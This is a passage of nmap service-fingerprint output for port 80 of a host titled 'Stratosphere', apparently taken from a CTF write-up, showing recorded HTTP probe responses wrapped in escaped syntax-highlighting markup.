+SF-Port80-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.92%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10/12%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6165EA91%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Get
+SF:Request,786,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20200&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Accept-Ranges:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20bytes&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ETag:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+SF:20W/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1708-1519762495000&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Last-Modified:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Tue,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2027&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Feb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2020
+SF:18&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2020:14:55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+SF:x201708&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Tue,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2012&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Oct&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2020:10:27&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Con
+SF:nection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;!DOCTYPE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20html&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+SF:20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;meta&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20charset=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;title&amp;gt;Stratosphere
+SF:&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20rel=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;stylesheet&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20type=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;text/cs
+SF:s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;div&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20id=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+SF:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/div&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;header&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;main-header&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;hidden&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;
+SF:div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;container&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;content-wr
+SF:ap&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;p&amp;gt;&amp;lt;i&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;fa&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20fa-diamond&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/i&amp;gt;
+SF:&amp;lt;/p&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;nav&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;a
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;btn&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;GettingStarted&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;html&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Get&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20started&amp;lt;/a&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;/nav&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;/div&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;/div&amp;gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:n&amp;lt;/header&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&amp;lt;section&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;greeting&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;con
+SF:tainer&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;content-wrap&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
+SF:0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;h1&amp;gt;Stratosphere&amp;lt;br&amp;gt;We&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20protect&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20your&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20credit&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&amp;lt;/h1&amp;gt;
+SF:&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;btn&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;GettingStarted&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:.html&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Get&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20started&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20now&amp;lt;/a&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;p&amp;gt;&amp;lt;i&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20cla
+SF:ss&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;ar&lt;span class=&quot;s2&quot;&gt;&quot;)%r(HTTPOptions,8A,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20200&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Allow:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GET,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20H
+SF:EAD,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20POST,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20PUT,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20DELETE,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20OPTIONS&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Length:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;200&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;
+SF:Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Connection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
+SF:0close&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(RTSPRequest,49,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20400&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue
+SF:,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Connection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20close&lt;span class=&quot;se&quot;&gt;\r\n\r&lt;/span&gt;
+SF:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(X11Probe,49,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20400&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:x202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Connection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20close&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(FourOhFo
+SF:urRequest,4F6,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20404&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Type:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;chars
+SF:et&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Language:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20en&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Length:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;201114&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:28&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Connection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20clos
+SF:e&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;doctype&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20html&amp;gt;&amp;lt;html&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;en&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;HTTP&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20St
+SF:atus&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20404&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;93&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Not&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Found&amp;lt;/title&amp;gt;&amp;lt;style&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;tex
+SF:t/css&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;h1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;backgrou
+SF:nd-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:22px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20h2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sa
+SF:ns-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:16px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20h3&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
+SF:0&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525
+SF:D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:14px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20body&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;co
+SF:lor:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sa
